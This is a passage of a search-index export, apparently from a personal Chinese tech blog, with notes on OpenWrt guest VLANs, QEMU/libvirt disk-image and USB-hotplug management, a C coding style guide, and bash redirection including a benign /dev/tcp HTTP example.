<p>\u4f46\u662f\u6b64\u65f6ax6s\u8fd8\u662f\u65e0\u6cd5dhcp\u83b7\u5f97ip\uff0c\u4e8e\u662f\u624b\u52a8\u6dfb\u52a0\u4e86\u4e00\u4e2a37.180\u7684\u5730\u5740\uff0c\u53d1\u73b0\u4ecd\u7136ping\u4e0d\u901a37.1 \u68c0\u67e5op2\uff0c\u53d1\u73b0guest\u65e0\u6cd5\u8bbf\u95ee\u8def\u7531\u5668\u81ea\u8eab\u56e0\u6b64\u65e0\u6cd5ping\u3002\u4e8e\u662f\u5f00\u542f\u4e86input\uff08\u4e4b\u540e\u53c8\u5173\u95ed\u4e86\uff0c\u6ca1\u95ee\u9898\uff09 </p> <p>\u6b64\u65f6\u53d1\u73b0guest\u5df2\u7ecf\u53ef\u4ee5\u4e0a\u7f51\u4e86\u3002\u4e0d\u77e5\u9053\u4e0a\u9762\u6b65\u9aa4\u4e2d\u54ea\u4e00\u6b65\u5bfc\u81f4\u7684\u3002</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/10/2022-11-10-%E8%99%9A%E6%8B%9F%E6%B8%B8%E6%88%8F%E6%88%BF/","title":"\u865a\u62df\u6e38\u620f\u623f","text":"<p>\u6253\u7b97\u5f04\u591a\u4e2awindows\u865a\u62df\u673a\uff0c\u5206\u4eab\u7ed9guest\u3002</p> <p>\u597d\u5904 -   pcie 4.0\u7684\u56fa\u6001\u4f5c\u7cfb\u7edf(6000MB\u7684\u8bfb\u5199\uff09 -   Ryzen 5800x + 16GB\u5185\u5b58 -   \u5171\u4eab\u9ad8\u6027\u80fd\u663e\u5361\uff08\u76ee\u524d\u4e3a1060 3G\uff09</p> <p>\u5177\u4f53 -   \u6240\u6709windows\u865a\u62df\u673a\u7684C\u76d8\u5171\u7528\u4e00\u4e2a\u57fa\u672c\u955c\u50cf     -   \u865a\u62df\u673a\u7684\u4fee\u6539\u5173\u673a\u540e\u4e0d\u4fdd\u5b58 -   \u6240\u6709windows\u865a\u62df\u673a\u5171\u4eab2TB\u7684\u6e38\u620f\u76d8     -   \u666e\u901a\u7528\u6237\u5173\u673a\u540e\uff0c\u6570\u636e\u4e0d\u4fdd\u5b58     -   \u7ba1\u7406\u5458\u865a\u62df\u673a\u5bf9\u5176\u4fee\u6539\u53ef\u4ee5\u4fdd\u5b58 -   \u4e00\u4e2a\u5b58\u50a8\u76d8\uff0c50GB\u3002\u6570\u636e\u79c1\u6709\u5e76\u8fdb\u884c\u4fdd\u5b58</p> <p>\u5b9e\u73b0 -   \u901a\u8fc7COW\u6587\u4ef6\u7cfb\u7edf\u7684overlay\u6280\u672f\uff0c\u5728base\u955c\u50cf\u4e0a\u521b\u5efa\u4e00\u4e2aoverlay\u955c\u50cf\u3002\u4e4b\u540e\u5220\u9664overlay\u5373\u53ef\u56de\u9000\u5230\u57fa\u7840\u72b6\u6001\u3002</p>","tags":["\u6e38\u620f\u623f","qemu"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/10/2022-11-10-%E8%99%9A%E6%8B%9F%E6%B8%B8%E6%88%8F%E6%88%BF/#\u955c\u50cf\u7ba1\u7406","title":"\u955c\u50cf\u7ba1\u7406","text":"<p>qemu-img overlay: https://kashyapc.fedorapeople.org/virt/lc-2012/snapshots-handout.html</p> <pre><code>#/var/lib/libvirt/images\n\nwin10-base.qcow2 --&gt; win10-basic.qcow2 --&gt;  overlay-win10-1.qcow2\n\noverlay-game1-1.qcow2\n\ndisk-1.qcow2\n\n\n#C, windows system\nqemu-img create -f qcow2 -F qcow2 -b /var/lib/libvirt/images/win10-basic.qcow2 overlay-win10-1.qcow2\n#E, games\nqemu-img create -f qcow2 -F qcow2 -b /mnt/Disk3/win10-game1.qcow2 overlay-game1-1.qcow2\n</code></pre> <ul> <li>win10-system: 150G</li> <li>/mnt/VM-Pool/win10.qcow2</li> <li>disk-life: 200G</li> <li>/mnt/VM-Pool/disk-life.qcow2</li> <li>disk-game: 2TB</li> <li>/mnt/Disk3/win10-game1.qcow2</li> </ul> <pre><code>\n</code></pre>","tags":["\u6e38\u620f\u623f","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/","title":"libvirt","text":"<p>libvirt</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#virt-manger","title":"virt-manger","text":"<p>\u56fe\u5f62\u5316\u754c\u9762</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#virsh","title":"virsh","text":"<p>\u547d\u4ee4\u884c\u5de5\u5177</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#\u5bfc\u51fa\u865a\u62df\u673a\u914d\u7f6e\u5e76\u5b9a\u4e49\u65b0\u865a\u62df\u673a","title":"\u5bfc\u51fa\u865a\u62df\u673a\u914d\u7f6e\uff0c\u5e76\u5b9a\u4e49\u65b0\u865a\u62df\u673a","text":"<pre><code>virsh dumpxml &lt;domain&gt; &gt; file.xml\n\n#\u7f16\u8f91file.xml\u4e2d\u7684uuid\uff0c\u4e0d\u80fd\u548c\u5176\u5b83\u91cd\u590d\u3002\u518d\u7f16\u8f91name\nvirsh define file.xml\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#qemu-img","title":"qemu-img","text":"","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#\u590d\u5236image\u590d\u5236\u7a00\u758f\u6587\u4ef6","title":"\u590d\u5236image(\u590d\u5236\u7a00\u758f\u6587\u4ef6)","text":"<p>kvm virtualization - What is fastest way to copy a sparse file? What method results in the smallest file? - Server Fault</p> <p>Via cp - best speed <pre><code>cp --sparse=always srcFile dstFile\nPerformance Notes:\n    Copied 200GB max/16GB actual VM as 200GB max/26GB actual, bloat: 10GB\n    Copy time: 1:02 (mm:ss) \n</code></pre></p> <p>Via dd - best overall performer <pre><code>dd if=srcFile of=dstFile iflag=direct oflag=direct bs=4M conv=sparse\nPerformance Notes:\n    Copied 200GB max/16GB actual VM as 200GB max/21GB actual, bloat: 5GB\n    Copy time: 2:02 (mm:ss)\n</code></pre></p> <p>Via virt-sparsify - best size <pre><code>virt-sparsify srcFile dstFile\n    Copied 200GB max/16GB actual VM as 200GB max/16GB actual, bloat: 0\n    Copy time: 17:37 (mm:ss)\n</code></pre></p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#cp","title":"cp","text":"<p><code>cp --sparse=always</code></p> <p>By  default,  sparse  SOURCE files are detected by a crude heuristic and the corresponding DEST file is made sparse as well.  That is the behavior selected by --sparse=auto.  Specify --sparse=always to create a sparse DEST file whenever the SOURCE file contains a long enough sequence of zero bytes.  Use --sparse=never to inhibit creation of sparse files.</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#virt-sparsify","title":"virt-sparsify","text":"<p>virt-sparsify (libguestfs.org) - \u652f\u6301\u591a\u79cd\u6587\u4ef6\u7cfb\u7edf\u3002Virt-sparsify can locate and sparsify free space in most filesystems (eg. ext2/3/4, btrfs, NTFS, etc.), and also in LVM physical volumes. - \u53ef\u4ee5\u5c06raw\u683c\u5f0f\u8f6c\u6362\u4e3aqcow2\u683c\u5f0f</p> <ul> <li>\u53d1\u73b0\u4e00\u4e2a\u4f18\u70b9\u540c\u65f6\u4e5f\u662f\u7f3a\u70b9\u3002virt-sparsify\u590d\u5236\u540e\u4f1a\u6e05\u9664\u73b0\u6709\u6587\u4ef6\u76840\u5143\u7d20\uff0c\u4f7f\u5f97\u6587\u4ef6\u53d8\u5c0f\uff0c\u4f46\u540c\u65f6\u4e5f\u4f1a\u5bfc\u81f4snapshot\u8bb0\u5f55\u6d88\u5931</li> </ul> <p>\u4f7f\u7528\u6ce8\u610f\uff1a - \u4f7f\u7528\u524d\u5173\u95ed\u865a\u62df\u673a - \u5728\u5220\u9664\u6e90\u955c\u50cf\u524d\u68c0\u67e5 - \u9700\u89812x\u7684\u7a7a\u95f4\uff081 tmp + 1 destination\uff09\uff08\u6700\u5dee\u60c5\u51b5\uff0c\u5b9e\u9645\u8fdc\u5c0f\u4e8e\u8be5\u503c\uff09   - virt-sparsify \u2265 1.26\u652f\u6301in-place\u53c2\u6570\uff0c\u907f\u514d\u4e86\u5927\u91cf\u7a7a\u95f4\u7684\u4f7f\u7528\u3002</p> <pre><code>sudo apt install guestfs-tools\nvirt-sparsify ori.img new.img\n</code></pre> <ul> <li>\u6307\u5b9atmp\u76ee\u5f55\uff1a<code>--tmp my_tmp_folder</code>\u3002\u4e0d\u652f\u6301<code>--in-place</code></li> <li>\u663e\u793a\u66f4\u591a\u4fe1\u606f\uff1a<code>-v</code></li> </ul>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#\u590d\u5236\u8fdc\u7a0bsparese\u6587\u4ef6","title":"\u590d\u5236\u8fdc\u7a0bsparese\u6587\u4ef6","text":"<p>Sparse Files | Syed Ali</p> <p>scp\u2019 is not sparse aware and if you use scp to copy a file that is spare it will take up \u201cmore\u201d room on the destination host. Instead if you use rsync with -S option, spare files will be maintained as sparse.</p> <pre><code>rsync -aPS Tianyi:/mnt/Disk1/default.img Backup/\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#\u589e\u5927image\u5927\u5c0f","title":"\u589e\u5927image\u5927\u5c0f","text":"<pre><code>qemu-img resize &lt;image&gt; +500G\n</code></pre> <p>\u7136\u540e\u5728windows\u4e2d\u5206\u914d\u7a7a\u95f4</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#\u51cf\u5c0fimage\u5927\u5c0f","title":"\u51cf\u5c0fimage\u5927\u5c0f","text":"<p>\u8981\u590d\u6742\u4e00\u4e9b \u53c2\u8003\uff1aResizing KVM qcow2 images - mauBlog (maunium.net)</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#overlay","title":"overlay","text":"<pre><code>qemu-img create -f qcow2 -F qcow2 -b base.qcow2 overlay.qcow2\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#\u5408\u5e76overlay","title":"\u5408\u5e76overlay","text":"<p>\u53c2\u8003\uff1aQemu: Merge snapshot and backing file into standalone disk | by Praveen Kumar | Medium</p> <p>\u5982\u679cB\u7684base\u662fA\uff0c\u5408\u5e76\u662f\u5c06B\u5408\u5e76\u5230\u57fa\u955c\u50cf\u4e2d\u3002\u56e0\u6b64\u6700\u597d\u5907\u4efd\u57fa\u955c\u50cf\u3002 <pre><code>qemu-img commit overlay.qcow2\n</code></pre></p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#\u53d8\u57fa","title":"\u53d8\u57fa","text":"<pre><code>qemu-img rebase -F qcow2 -f qcow2 -b base.qcow2 overlay.qcow2\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#convert","title":"convert","text":"<p><pre><code>qemu-img convert disk-life.qcow2 /mnt/VM-Pool/disk-life.raw\n</code></pre> \u65f6\u95f4\u5de8\u957f\u300240G\u82b1\u4e8630\u5206\u949f\u3002\u5e76\u4e14\u671f\u95f4zfs\u7684\u7cfb\u7edf\u65e0\u59a8\u4f7f\u7528\u3002</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#qemu-agent","title":"QEMU agent","text":"<p>\u7528\u4e8e\u63a7\u5236windows\u865a\u62df\u673a\u5173\u673a\uff0c\u4f11\u7720(domsuspend)</p> <p>\u53c2\u8003\uff1a - Qemu Guest Agent\u65b9\u5f0f\u5b9e\u73b0libvirt\u4e0e\u865a\u673a\u4ea4\u4e92_HelloWuyp\u7684\u535a\u5ba2-CSDN\u535a\u5ba2_blacklist_rpc - 10.3.\u00a0Running the QEMU Guest Agent on a Windows Guest Red Hat Enterprise Linux 6 | Red Hat Customer Portal</p> <p>\u53c2\u8003\u7684\u90fd\u592a\u590d\u6742\u4e86\uff0c\u5b9e\u9645\u64cd\u4f5c\u5982\u4e0b\uff08\u8fd8\u6ca1\u9a8c\u8bc1\u6548\u679c\uff09\uff1a - \u9a8c\u8bc1\u4e86\u6548\u679c\uff0c\u865a\u62df\u673a\u5173\u4e0d\u6389\uff0c\u4e00\u76f4\u5728running\uff0c\u53ea\u80fd\u901a\u8fc7virsh destory\u624d\u80fd\u5f3a\u884c\u5173\u6389\u3002</p> <p>windows\u865a\u62df\u673a\u5185\u4e0b\u8f7d\u5e76\u5b89\u88c5 https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/archive-virtio/ https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/archive-qemu-ga/</p> <p>virt-manger\u4e2d\u6dfb\u52a0channel\uff0c\u9009\u62e9qemu-agent\uff0c\u5176\u4f59\u4f1a\u81ea\u52a8\u914d\u7f6e</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#\u70ed\u63d2\u62d4usb","title":"\u70ed\u63d2\u62d4usb","text":"<p>olavmrk/usb-libvirt-hotplug: Script to attach and detach USB devices from libvirt virtual machines based on udev rules. (github.com)</p> <p>udev: udev - ArchWiki (archlinux.org) - udev(7) \u2014 Arch manual pages (archlinux.org)</p> <pre><code>ID_VENDOR_ID=0a12\nID_MODEL_ID=0001\n/devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-3/3-3.4 (usb)\n\nSUBSYSTEM==\"usb\",DEVPATH==\"/devices/pci0000:00/0000:00:1a.0/usb1/1-1/1-1.2\",RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh testvm-01\"\nSUBSYSTEM==\"usb\",ID_VENDOR_ID==\"0a12\",ID_MODEL_ID=\"0001\",RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh win10\"\n</code></pre> <pre><code>KERNEL==\"video[0-9]*\", SUBSYSTEM==\"video4linux\", SUBSYSTEMS==\"usb\", ATTRS{idVendor}==\"1de1\", ATTRS{idProduct}==\"f105\", RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh win10\"\n# bluetooth\nSUBSYSTEMS==\"usb\", ATTRS{idVendor}==\"0a12\", ATTRS{idProduct}==\"0001\", RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh win10\"\n# mouse\nSUBSYSTEMS==\"usb\", ATTRS{idVendor}==\"30fa\", ATTRS{idProduct}==\"0400\", RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh win10\"\n# keyboard\nSUBSYSTEMS==\"usb\", ATTRS{idVendor}==\"1a81\", ATTRS{idProduct}==\"2039\", RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh win10\"\n</code></pre> <ul> <li>\u76d1\u542cusb\u8bbe\u5907</li> <li>\u62d4\u6389\u4f1a\u51fa\u73b0unbind, remove\u4e8b\u4ef6</li> <li>\u63d2\u5165\u4f1a\u51fa\u73b0add, change, bind\u4e8b\u4ef6 <pre><code>udevadm monitor --property --udev --subsystem-match=usb/usb_device\n</code></pre></li> </ul> <pre><code>UDEV  [262962.917716] unbind   /devices/pci0000:00/0000:00:01.2/0000:02:00.0/usb1/1-3 (usb)\nACTION=unbind\nDEVPATH=/devices/pci0000:00/0000:00:01.2/0000:02:00.0/usb1/1-3\nSUBSYSTEM=usb\nDEVNAME=/dev/bus/usb/001/009\nDEVTYPE=usb_device\nPRODUCT=1de1/f105/409\nTYPE=239/2/1\nBUSNUM=001\nDEVNUM=009\nSEQNUM=7429\nUSEC_INITIALIZED=261113847055\nID_PATH=pci-0000:02:00.0-usb-0:3\nID_PATH_TAG=pci-0000_02_00_0-usb-0_3\nMAJOR=189\nMINOR=8\n</code></pre> <pre><code>UDEV  [262890.680932] bind     /devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-3/3-3.4 (usb)\nACTION=bind\nDEVPATH=/devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-3/3-3.4\nSUBSYSTEM=usb\nDEVNAME=/dev/bus/usb/003/023\nDEVTYPE=usb_device\nDRIVER=usb\nPRODUCT=a12/1/8891\nTYPE=224/1/1\nBUSNUM=003\nDEVNUM=023\nSEQNUM=7414\nUSEC_INITIALIZED=262890673093\nID_VENDOR=0a12\nID_VENDOR_ENC=0a12\nID_VENDOR_ID=0a12\nID_MODEL=CSR8510_A10\nID_MODEL_ENC=CSR8510\\x20A10\nID_MODEL_ID=0001\nID_REVISION=8891\nID_SERIAL=0a12_CSR8510_A10\nID_BUS=usb\nID_USB_INTERFACES=:e00101:\nID_VENDOR_FROM_DATABASE=Cambridge Silicon Radio, Ltd\nID_MODEL_FROM_DATABASE=Bluetooth Dongle (HCI mode)\nID_PATH=pci-0000:0a:00.3-usb-0:3.4\nID_PATH_TAG=pci-0000_0a_00_3-usb-0_3_4\nMAJOR=189\nMINOR=278\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/12/2022-11-12-libvirt/#\u4f11\u7720","title":"\u4f11\u7720","text":"<p>OVMF\u4e0d\u652f\u6301S4(sleep to disk, hibernation) https://listman.redhat.com/archives/vfio-users/2017-September/msg00011.html <pre><code>PS C:\\Windows\\system32&gt;  powercfg /A\n\u6b64\u7cfb\u7edf\u4e0a\u6ca1\u6709\u4ee5\u4e0b\u7761\u7720\u72b6\u6001:\n    \u5f85\u673a (S1)\n        \u7cfb\u7edf\u56fa\u4ef6\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n        \u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n\n    \u5f85\u673a (S2)\n        \u7cfb\u7edf\u56fa\u4ef6\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n        \u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n\n    \u5f85\u673a (S3)\n        \u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n\n    \u4f11\u7720\n        \u8be5\u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u4e0d\u652f\u6301\u4f11\u7720\u3002\n\n    \u5f85\u673a(S0 \u4f4e\u7535\u91cf\u5f85\u673a)\n        \u7cfb\u7edf\u56fa\u4ef6\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n\n    \u6df7\u5408\u7761\u7720\n        \u5f85\u673a(S3)\u4e0d\u53ef\u7528\u3002\n        \u4f11\u7720\u4e0d\u53ef\u7528\u3002\n        \u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u4e0d\u652f\u6301\u6b64\u5f85\u673a\u72b6\u6001\u3002\n\n    \u5feb\u901f\u542f\u52a8\n        \u4f11\u7720\u4e0d\u53ef\u7528\u3002\n</code></pre></p> <p>https://www.linux-kvm.org/page/PowerManagement</p> <p>libvirt\u5f00\u542f\u4f11\u7720\u9009\u9879\uff1a <pre><code>&lt;pm&gt;\n  &lt;suspend-to-disk enabled='yes'/&gt;\n  &lt;suspend-to-mem enabled='yes'/&gt;\n&lt;/pm&gt;\n</code></pre></p> <p>These elements enable ('yes') or disable ('no') BIOS support for S3 (suspend-to-mem) and S4 (suspend-to-disk) ACPI sleep states. If nothing is specified, then the hypervisor will be left with its default value. Note: This setting cannot prevent the guest OS from performing a suspend as the guest OS itself can choose to circumvent the unavailability of the sleep states (e.g. S4 by turning off completely).</p> <p>\u279c  VM-Pool sudo virsh domtime win10-base error: argument unsupported: QEMU guest agent is not configured</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/14/2022-11-14-C%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83/","title":"C\u7f16\u7a0b\u98ce\u683c\u89c4\u8303","text":"<p>C\u7f16\u7a0b\u98ce\u683c\u89c4\u8303</p> <ul> <li>identation</li> <li>\u4f7f\u75284\u4e2a\u7a7a\u683c\uff08\u4e0d\u7528tab\uff0c\u56e0\u4e3atab\u5bbd\u5ea6\u4e0d\u4e00\u81f4\uff0c\u5e76\u4e14diff\u5de5\u5177\u66f4\u6613\u9605\u8bfb\uff09</li> <li>brace</li> <li>if, while\u5de6\u82b1\u62ec\u53f7\u5728\u540c\u4e00\u884c</li> <li>\u51fd\u6570\u5b9a\u4e49\uff0c\u7c7b\u5b9a\u4e49\uff0c\u5728\u4e0b\u4e00\u884c</li> <li>\u53d8\u91cf\u540d</li> <li>\u7c7b\u540d\uff1aFooBarCPU</li> <li>\u6210\u5458\uff1abarVariable</li> <li>\u5c40\u90e8\u53d8\u91cf\uff1anew_value</li> <li>include</li> <li>\u5148main header file\uff08\u548ccc\u6587\u4ef6\u540d\u76f8\u540c\u7684\u5934\u6587\u4ef6\uff09</li> <li>\u7136\u540e\u6309\u5b57\u5178\u987a\u5e8f\uff08\u4e3a\u4e86\u5bb9\u6613\u627e\u5230\u91cd\u590dinclude\uff09</li> <li>document</li> <li>Doxygen\uff1a\u81ea\u52a8\u751f\u6210\u6587\u6863     &gt; Doxygen allows users to quickly create documentation for our code by extracting the relavent information from the code and comments. It is able to document all the code structures including classes, namespaces, files, members, defines, etc.</li> <li>javadoc comment\uff1a\u4ee5\u4e24\u4e2a*\u5f00\u5934\u7684C\u98ce\u683c\u6ce8\u91ca     <pre><code>/**\n * This is the brief description. This is the start of the detailed\n * description. Detailed Description continued.\n */\n</code></pre></li> <li>\u4f8b\u5b50     <pre><code>/**\n * @file\n * Contains an example of documentation style.\n */\n\n#include &lt;vector&gt;\n\n/**\n * Adds two numbers together.\n */\n#define DUMMY(a,b) (a+b)\n\n/**\n * A simple class description. This class does really great things in detail.\n *\n * @todo Update to new statistics model.\n */\nclass foo\n{\n  /** This variable stores blah, which does foo and has invariants x,y,z\n         @warning never set this to 0\n         @invariant foo\n    */\n   int myVar;\n\n /**\n  * This function does something.\n  * @param a The number of times to do it.\n  * @param b The thing to do it to.\n  * @return The number of times it was done.\n  *\n  * @sa DUMMY\n  */\n int bar(int a, long b);\n\n\n /**\n  * A function that does bar.\n  * @retval true if there is a problem, false otherwise.\n  */\n bool manchu();\n\n};\n</code></pre></li> <li>\u4ee3\u7801</li> <li>C\u6587\u4ef6\u4e2d\u4e0d\u8be5\u6709extern\u58f0\u660e\uff0c\u800c\u5e94\u8be5\u901a\u8fc7\u5305\u542b\u5934\u6587\u4ef6\u65b9\u5f0f     &gt; The key here is that we have a single external declaration in the .hh file that the compiler will automatically check for consistency with the .cc file. (This isn\u2019t as important in C++ as it was in C, since linker name mangling will now catch these errors, but it\u2019s still a good idea.)</li> </ul>","tags":["style","C"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/","title":"bash","text":"<p>bash</p>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>Bash Reference Manual: https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html</p>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#rediction","title":"rediction","text":"<p>Redirections (Bash Reference Manual) (gnu.org) \u6bcf\u4e2a\u7a0b\u5e8f\u6709\u4e00\u4e2a\u6253\u5f00\u6587\u4ef6\u8868\uff0c\u8bb0\u5f55\u6587\u4ef6\u63cf\u8ff0\u7b26fd\u548c\u5bf9\u5e94\u7684\u6587\u4ef6vnode - 0: stdinput - 1: stdout - 2: stderr</p> <p>\u91cd\u5b9a\u5411\u5c31\u662f\u4fee\u6539\u5176\u4e2d\u7684\u9879 - \u91cd\u5b9a\u5411\u5230\u6587\u4ef6\uff08\u65b0\u5efa\u6587\u4ef6\uff0c\u6216\u8005truncte\u5df2\u6709\u6587\u4ef6\uff09 - duplicate\uff0c\u590d\u5236\u5df2\u6709\u7684\u9879</p> <pre><code>n&gt;file  # \u91cd\u5b9a\u5411\u8f93\u51fan\uff0cn\u9ed8\u8ba4\u4e3a1\nn&lt;file  # \u91cd\u5b9a\u5411\u8f93\u5165n\uff0cn\u9ed8\u8ba4\u4e3a0\n\n&amp;&gt;file  # \u91cd\u5b9a\u5411stdout\u548cstderr\n\nn&gt;&gt;file # \u91cd\u5b9a\u5411\u8f93\u51fan\uff0cappend\u5230\u6587\u4ef6\n&amp;&gt;&gt;file # \u91cd\u5b9a\u5411stdout\u548cstderr\uff0cappend\u5230\u6587\u4ef6\n\nn&gt;&amp;m    # \u590d\u5236\u6587\u4ef6\u63cf\u8ff0\u7b26\n</code></pre> <p>\u91cd\u5b9a\u5411\u987a\u5e8f\u5f88\u91cd\u8981 - \u7b2c\u4e00\u884c\u547d\u4ee4\uff0c\u5148\u5c06stdout\u91cd\u5b9a\u5411\u4e3a\u6587\u4ef6\uff0c\u7136\u540e\u7528stdout\u9879\u8986\u76d6stderr\u9879\uff0c\u56e0\u6b64\u4e8c\u8005\u90fd\u6307\u5411\u6587\u4ef6 - stderr\u5148\u88ab\u91cd\u5b9a\u5411\u5230stdout\uff0c\u7136\u540e\u628astdout\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\u3002\u56e0\u6b64stderr\u8fd8\u662f\u4f1a\u8f93\u51fa\u5230\u5c4f\u5e55\u4e0a <pre><code>ls &gt; dirlist 2&gt;&amp;1  # stdout\u548cstderr\u88ab\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\nls 2&gt;&amp;1 &gt; dirlist  # stderr\u4ecd\u4f1a\u8f93\u51fa\u5728\u5c4f\u5e55\n\nls 2&gt;dirlist &gt;&amp;2   # \u662f\u5426\u53ef\u884c?   \u5b9e\u9a8c\u786e\u5b9e\u53ef\u884c\n</code></pre></p>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u7279\u6b8a\u7684\u91cd\u5b9a\u5411\u6587\u4ef6\u7f51\u7edc","title":"\u7279\u6b8a\u7684\u91cd\u5b9a\u5411\u6587\u4ef6\uff1a\u7f51\u7edc","text":"<p>zsh\u4e0d\u652f\u6301</p> <p>bash - /dev/tcp not found - Unix &amp; Linux Stack Exchange</p> <pre><code>printf \"GET / HTTP/1.1\\n\\n\" &gt; /dev/tcp/74.125.225.19/80\n</code></pre> <p>Redirections (Bash Reference Manual) (gnu.org) <code>/dev/tcp/host/port</code> If\u00a0host\u00a0is a valid hostname or Internet address, and\u00a0port\u00a0is an integer port number or service name, Bash attempts to open the corresponding TCP socket. <code>/dev/udp/host/port</code> If\u00a0host\u00a0is a valid hostname or Internet address, and\u00a0port\u00a0is an integer port number or service name, Bash attempts to open the corresponding UDP socket.</p>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u5176\u5b83","title":"\u5176\u5b83","text":"<p>here-document <pre><code>[n]&lt;&lt;[-]word\n        here-document\ndelimiter\n</code></pre></p> <p>here-string <pre><code>[n]&lt;&lt;&lt; word\n</code></pre></p> <p>Moving File Descriptors <pre><code>[n]&lt;&amp;digit-\n[n]&gt;&amp;digit-  # \u91cd\u5b9a\u5411\u540e\uff0c\u5173\u95eddigit\n</code></pre></p> <p>Opening File Descriptors for Reading and Writing</p> <p>causes the file whose name is the expansion of\u00a0word\u00a0to be opened for both reading and writing on file descriptor\u00a0n <pre><code>[n]&lt;&gt;word\n</code></pre></p>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#expansion\u6269\u5c55","title":"expansion(\u6269\u5c55)","text":"<p>\u6269\u5c55 = \u66ff\u6362 = \u5c55\u5f00</p> <p>\u6269\u5c55\u5373\u5c06\u4e00\u4e2a\u53d8\u91cf\u5c55\u5f00\uff0c\u5f97\u5230\u5b9e\u9645\u7684\u503c\u3002\u7528\u4e8e\u53d8\u91cf\u5b9a\u4e49\u3001\u547d\u4ee4\u66ff\u6362\u7b49\u5730\u65b9\u3002</p>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u53d8\u91cf\u6269\u5c55","title":"\u53d8\u91cf\u6269\u5c55","text":"<p>bash\u624b\u518c\u4e2d\u5c06\u53d8\u91cf\u79f0\u4e3ashell parameter</p> <ul> <li> <p>\u672a\u5b9a\u4e49\u65f6\u66ff\u6362 </p> </li> <li> <p>\u5b9a\u4e49\u65f6\u66ff\u6362  \u7528\u9014 